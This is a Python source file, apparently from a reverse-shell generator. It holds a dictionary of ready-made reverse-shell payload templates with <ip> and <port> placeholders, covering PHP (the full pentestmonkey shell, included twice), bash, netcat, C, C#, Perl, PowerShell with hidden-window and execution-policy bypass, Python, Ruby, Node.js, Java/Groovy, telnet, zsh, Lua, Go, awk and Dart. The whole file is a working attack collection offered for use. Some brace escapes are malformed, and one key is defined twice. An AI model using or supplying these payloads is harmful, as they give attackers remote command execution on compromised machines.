
methods = {

'php' :[f"""
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = {chr(34)}1.0{chr(34)};
$ip = '<ip>';
$port = <port>;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {chr(123)}{chr(125)}
	$pid = pcntl_fork();
	
	if ($pid == -1) {chr(123)}{chr(125)}
		printit({chr(34)}ERROR: Can't fork{chr(34)});
		exit(1);
	{chr(125)}
	
	if ($pid) {chr(123)}{chr(125)}
		exit(0);  // Parent exits
	{chr(125)}
	if (posix_setsid() == -1) {chr(123)}{chr(125)}
		printit({chr(34)}Error: Can't setsid(){chr(34)});
		exit(1);
	{chr(125)}

	$daemon = 1;
{chr(125)} else {chr(123)}{chr(125)}
	printit({chr(34)}WARNING: Failed to daemonise.  This is quite common and not fatal.{chr(34)});
{chr(125)}

chdir({chr(34)}/{chr(34)});

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {chr(123)}{chr(125)}
	printit({chr(34)}$errstr ($errno){chr(34)});
	exit(1);
{chr(125)}

$descriptorspec = array(
   0 => array({chr(34)}pipe{chr(34)}, {chr(34)}r{chr(34)}),  // stdin is a pipe that the child will read from
   1 => array({chr(34)}pipe{chr(34)}, {chr(34)}w{chr(34)}),  // stdout is a pipe that the child will write to
   2 => array({chr(34)}pipe{chr(34)}, {chr(34)}w{chr(34)})   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {chr(123)}{chr(125)}
	printit({chr(34)}ERROR: Can't spawn shell{chr(34)});
	exit(1);
{chr(125)}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit({chr(34)}Successfully opened reverse shell to $ip:$port{chr(34)});

while (1) {chr(123)}{chr(125)}
	if (feof($sock)) {chr(123)}{chr(125)}
		printit({chr(34)}ERROR: Shell connection terminated{chr(34)});
		break;
	{chr(125)}

	if (feof($pipes[1])) {chr(123)}{chr(125)}
		printit({chr(34)}ERROR: Shell process terminated{chr(34)});
		break;
	{chr(125)}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {chr(123)}{chr(125)}
		if ($debug) printit({chr(34)}SOCK READ{chr(34)});
		$input = fread($sock, $chunk_size);
		if ($debug) printit({chr(34)}SOCK: $input{chr(34)});
		fwrite($pipes[0], $input);
	{chr(125)}

	if (in_array($pipes[1], $read_a)) {chr(123)}{chr(125)}
		if ($debug) printit({chr(34)}STDOUT READ{chr(34)});
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit({chr(34)}STDOUT: $input{chr(34)});
		fwrite($sock, $input);
	{chr(125)}

	if (in_array($pipes[2], $read_a)) {chr(123)}{chr(125)}
		if ($debug) printit({chr(34)}STDERR READ{chr(34)});
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit({chr(34)}STDERR: $input{chr(34)});
		fwrite($sock, $input);
	{chr(125)}
{chr(125)}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {chr(123)}{chr(125)}
	if (!$daemon) {chr(123)}{chr(125)}
		print {chr(34)}$string\n{chr(34)};
	{chr(125)}
{chr(125)}

?>
"""],

'bash' : [f""" bash -i >& /dev/tcp/<ip>/<port> 0>&1""",f""" 0<&196;exec 196<>/dev/tcp/<ip>/<port>; bash <&196 >&196 2>&196""", f""" exec 5<>/dev/tcp/<ip>/<port>;cat <&5 | while read line; do $line 2>&5 >&5; done """],
'nc' : [f""" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <ip> <port> >/tmp/f """,f""" nc -e bash <ip> <port> """, f""" nc.exe -e bash <ip> <port> """],
'c' : [f""" #include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){chr(123)}{chr(125)}
    int port = <port>;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr({chr(34)}<ip>{chr(34)});

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {chr(123)}{chr(125)}{chr(34)}bash{chr(34)}, NULL{chr(125)};
    execve({chr(34)}bash{chr(34)}, argv, NULL);

    return 0;       
{chr(125)} """],
'c#' : [f""" using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{chr(123)}{chr(125)}
	public class Program
	{chr(123)}{chr(125)}
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{chr(123)}{chr(125)}
			using(TcpClient client = new TcpClient({chr(34)}<ip>{chr(34)}, <port>))
			{chr(123)}{chr(125)}
				using(Stream stream = client.GetStream())
				{chr(123)}{chr(125)}
					using(StreamReader rdr = new StreamReader(stream))
					{chr(123)}{chr(125)}
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = {chr(34)}cmd.exe{chr(34)};
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{chr(123)}{chr(125)}
							strInput.Append(rdr.ReadLine());
							//strInput.Append({chr(34)}\n{chr(34)});
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						{chr(125)}
					{chr(125)}
				{chr(125)}
			{chr(125)}
		{chr(125)}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {chr(123)}{chr(125)}
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {chr(123)}{chr(125)}
                try
                {chr(123)}{chr(125)}
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                {chr(125)}
                catch (Exception err) {chr(123)}{chr(125)} {chr(125)}
            {chr(125)}
        {chr(125)}

	{chr(125)}
{chr(125)} """],
'perl' : [f""" perl -e 'use Socket;$i={chr(34)}<ip>{chr(34)};$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname({chr(34)}tcp{chr(34)}));if(connect(S,sockaddr_in($p,inet_aton($i)))){chr(123)}{chr(125)}open(STDIN,{chr(34)}>&S{chr(34)});open(STDOUT,{chr(34)}>&S{chr(34)});open(STDERR,{chr(34)}>&S{chr(34)});exec({chr(34)}bash -i{chr(34)});{chr(125)};'"""],
'php-pentest-monkey' : [f""" <?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = {chr(34)}1.0{chr(34)};
$ip = '<ip>';
$port = <port>;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {chr(123)}{chr(125)}
	$pid = pcntl_fork();
	
	if ($pid == -1) {chr(123)}{chr(125)}
		printit({chr(34)}ERROR: Can't fork{chr(34)});
		exit(1);
	{chr(125)}
	
	if ($pid) {chr(123)}{chr(125)}
		exit(0);  // Parent exits
	{chr(125)}
	if (posix_setsid() == -1) {chr(123)}{chr(125)}
		printit({chr(34)}Error: Can't setsid(){chr(34)});
		exit(1);
	{chr(125)}

	$daemon = 1;
{chr(125)} else {chr(123)}{chr(125)}
	printit({chr(34)}WARNING: Failed to daemonise.  This is quite common and not fatal.{chr(34)});
{chr(125)}

chdir({chr(34)}/{chr(34)});

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {chr(123)}{chr(125)}
	printit({chr(34)}$errstr ($errno){chr(34)});
	exit(1);
{chr(125)}

$descriptorspec = array(
   0 => array({chr(34)}pipe{chr(34)}, {chr(34)}r{chr(34)}),  // stdin is a pipe that the child will read from
   1 => array({chr(34)}pipe{chr(34)}, {chr(34)}w{chr(34)}),  // stdout is a pipe that the child will write to
   2 => array({chr(34)}pipe{chr(34)}, {chr(34)}w{chr(34)})   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {chr(123)}{chr(125)}
	printit({chr(34)}ERROR: Can't spawn shell{chr(34)});
	exit(1);
{chr(125)}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit({chr(34)}Successfully opened reverse shell to $ip:$port{chr(34)});

while (1) {chr(123)}{chr(125)}
	if (feof($sock)) {chr(123)}{chr(125)}
		printit({chr(34)}ERROR: Shell connection terminated{chr(34)});
		break;
	{chr(125)}

	if (feof($pipes[1])) {chr(123)}{chr(125)}
		printit({chr(34)}ERROR: Shell process terminated{chr(34)});
		break;
	{chr(125)}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {chr(123)}{chr(125)}
		if ($debug) printit({chr(34)}SOCK READ{chr(34)});
		$input = fread($sock, $chunk_size);
		if ($debug) printit({chr(34)}SOCK: $input{chr(34)});
		fwrite($pipes[0], $input);
	{chr(125)}

	if (in_array($pipes[1], $read_a)) {chr(123)}{chr(125)}
		if ($debug) printit({chr(34)}STDOUT READ{chr(34)});
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit({chr(34)}STDOUT: $input{chr(34)});
		fwrite($sock, $input);
	{chr(125)}

	if (in_array($pipes[2], $read_a)) {chr(123)}{chr(125)}
		if ($debug) printit({chr(34)}STDERR READ{chr(34)});
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit({chr(34)}STDERR: $input{chr(34)});
		fwrite($sock, $input);
	{chr(125)}
{chr(125)}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {chr(123)}{chr(125)}
	if (!$daemon) {chr(123)}{chr(125)}
		print {chr(34)}$string\n{chr(34)};
	{chr(125)}
{chr(125)}

?> """],
'php' : [f""" php -r '$sock=fsockopen({chr(34)}<ip>{chr(34)},<port>);exec({chr(34)}bash <&3 >&3 2>&3{chr(34)});' """,f""" php -r '$sock=fsockopen({chr(34)}<ip>{chr(34)},<port>);shell_exec({chr(34)}bash <&3 >&3 2>&3{chr(34)});'""", f""" php -r '$sock=fsockopen({chr(34)}<ip>{chr(34)},<port>);system({chr(34)}bash <&3 >&3 2>&3{chr(34)});' """, f""" php -r '$sock=fsockopen({chr(34)}<ip>{chr(34)},<port>);`bash <&3 >&3 2>&3`;' """],
'powershell' : [f""" powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient({chr(34)}<ip>{chr(34)},<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{chr(123)}{chr(125)}0{chr(125)};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){chr(123)}{chr(125)};$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + {chr(34)}PS {chr(34)} + (pwd).Path + {chr(34)}> {chr(34)};$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush(){chr(125)};$client.Close() """,f""" powershell -nop -c {chr(34)}$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{chr(123)}{chr(125)}0{chr(125)};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){chr(123)}{chr(125)};$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush(){chr(125)};$client.Close(){chr(34)} """,f""" powershell -nop -W hidden -noni -ep bypass -c {chr(34)}$TCPClient = New-Object Net.Sockets.TCPClient('<ip>', <port>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {chr(123)}{chr(125)}[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {chr(123)}{chr(125)}0{chr(125)};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush(){chr(125)}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {chr(123)}{chr(125)}$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {chr(123)}{chr(125)}Invoke-Expression $Command 2>&1 | Out-String{chr(125)} catch {chr(123)}{chr(125)}$_ | Out-String{chr(125)}WriteToStream ($Output){chr(125)}$StreamWriter.Close(){chr(34)}  """],
'python' : [f""" export RHOST={chr(34)}<ip>{chr(34)};export RPORT=<port>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv({chr(34)}RHOST{chr(34)}),int(os.getenv({chr(34)}RPORT{chr(34)}))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn({chr(34)}bash{chr(34)})'""",f""" python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({chr(34)}<ip>{chr(34)},<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn({chr(34)}bash{chr(34)})' """],
'python3' : [f""" export RHOST={chr(34)}<ip>{chr(34)};export RPORT=<port>;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv({chr(34)}RHOST{chr(34)}),int(os.getenv({chr(34)}RPORT{chr(34)}))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn({chr(34)}bash{chr(34)})'""",f""" python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({chr(34)}<ip>{chr(34)},<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn({chr(34)}bash{chr(34)})'""",f""" python3 -c 'import os,pty,socket;s=socket.socket();s.connect(({chr(34)}<ip>{chr(34)},<port>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn({chr(34)}bash{chr(34)})' """],
'ruby' : [f""" ruby -rsocket -e'spawn({chr(34)}sh{chr(34)},[:in,:out,:err]=>TCPSocket.new({chr(34)}<ip>{chr(34)},<port>))' """],
'nodejs' : [f""" require('child_process').exec('nc -e bash <ip> <port>') """,f""" require('child_process').exec('nc -e bash <ip> <port>') """],
'javascript' : [f""" String command = {chr(34)}var host = '<ip>';{chr(34)} +
                       {chr(34)}var port = <port>;{chr(34)} +
                       {chr(34)}var cmd = 'bash';{chr(34)}+
                       {chr(34)}var s = new java.net.Socket(host, port);{chr(34)} +
                       {chr(34)}var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();{chr(34)}+
                       {chr(34)}var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();{chr(34)}+
                       {chr(34)}var po = p.getOutputStream(), so = s.getOutputStream();{chr(34)}+
                       {chr(34)}print ('Connected');{chr(34)}+
                       {chr(34)}while (!s.isClosed()) {chr(123)}{chr(125)}{chr(34)}+
                       {chr(34)}    while (pi.available() > 0){chr(34)}+
                       {chr(34)}        so.write(pi.read());{chr(34)}+
                       {chr(34)}    while (pe.available() > 0){chr(34)}+
                       {chr(34)}        so.write(pe.read());{chr(34)}+
                       {chr(34)}    while (si.available() > 0){chr(34)}+
                       {chr(34)}        po.write(si.read());{chr(34)}+
                       {chr(34)}    so.flush();{chr(34)}+
                       {chr(34)}    po.flush();{chr(34)}+
                       {chr(34)}    java.lang.Thread.sleep(50);{chr(34)}+
                       {chr(34)}    try {chr(123)}{chr(125)}{chr(34)}+
                       {chr(34)}        p.exitValue();{chr(34)}+
                       {chr(34)}        break;{chr(34)}+
                       {chr(34)}    {chr(125)}{chr(34)}+
                       {chr(34)}    catch (e) {chr(123)}{chr(125)}{chr(34)}+
                       {chr(34)}    {chr(125)}{chr(34)}+
                       {chr(34)}{chr(125)}{chr(34)}+
                       {chr(34)}p.destroy();{chr(34)}+
                       {chr(34)}s.close();{chr(34)};
String x = {chr(34)}\{chr(34)}\{chr(34)}.getClass().forName(\{chr(34)}javax.script.ScriptEngineManager\{chr(34)}).newInstance().getEngineByName(\{chr(34)}JavaScript\{chr(34)}).eval(\{chr(34)}{chr(34)}+command+{chr(34)}\{chr(34)}){chr(34)};
ref.add(new StringRefAddr({chr(34)}x{chr(34)}, x); """],
'groovy' : [f""" String host={chr(34)}<ip>{chr(34)};int port=<port>;String cmd={chr(34)}bash{chr(34)};Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){chr(123)}{chr(125)}while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {chr(123)}{chr(125)}p.exitValue();break;{chr(125)}catch (Exception e){chr(123)}{chr(125)}{chr(125)}{chr(125)};p.destroy();s.close(); """],
'telnet' : [f""" TF=$(mktemp -u);mkfifo $TF && telnet <ip> <port> 0<$TF | bash 1>$TF """],
'zsh' : [f""" zsh -c 'zmodload zsh/net/tcp && ztcp <ip> <port> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY' """],
'lua' : [f""" lua -e {chr(34)}require('socket');require('os');t=socket.tcp();t:connect('<ip>','<port>');os.execute('bash -i <&3 >&3 2>&3');{chr(34)} """,f""" lua5.1 -e 'local host, port = {chr(34)}<ip>{chr(34)}, <port> local socket = require({chr(34)}socket{chr(34)}) local tcp = socket.tcp() local io = require({chr(34)}io{chr(34)}) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, {chr(34)}r{chr(34)}) local s = f:read({chr(34)}*a{chr(34)}) f:close() tcp:send(s) if status == {chr(34)}closed{chr(34)} then break end end tcp:close()' """],
'golang' : [f""" echo 'package main;import{chr(34)}os/exec{chr(34)};import{chr(34)}net{chr(34)};func main(){chr(123)}{chr(125)}c,_:=net.Dial({chr(34)}tcp{chr(34)},{chr(34)}<ip>:<port>{chr(34)});cmd:=exec.Command({chr(34)}bash{chr(34)});cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run(){chr(125)}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go """],
'awk' : [f""" awk 'BEGIN {chr(123)}{chr(125)}s = {chr(34)}/inet/tcp/0/<ip>/<port>{chr(34)}; while(42) {chr(123)}{chr(125)} do{chr(123)}{chr(125)} printf {chr(34)}shell>{chr(34)} |& s; s |& getline c; if(c){chr(123)}{chr(125)} while ((c |& getline) > 0) print $0 |& s; close(c); {chr(125)} {chr(125)} while(c != {chr(34)}exit{chr(34)}) close(s); {chr(125)}{chr(125)}' /dev/null """],
'dart' : [f""" import 'dart:io';
import 'dart:convert';

main() {chr(123)}{chr(125)}
  Socket.connect({chr(34)}<ip>{chr(34)}, <port>).then((socket) {chr(123)}{chr(125)}
    socket.listen((data) {chr(123)}{chr(125)}
      Process.start('bash', []).then((Process process) {chr(123)}{chr(125)}
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) {chr(123)}{chr(125)} socket.write(output); {chr(125)});
      {chr(125)});
    {chr(125)},
    onDone: () {chr(123)}{chr(125)}
      socket.destroy();
    {chr(125)});
  {chr(125)});
{chr(125)} """],

}
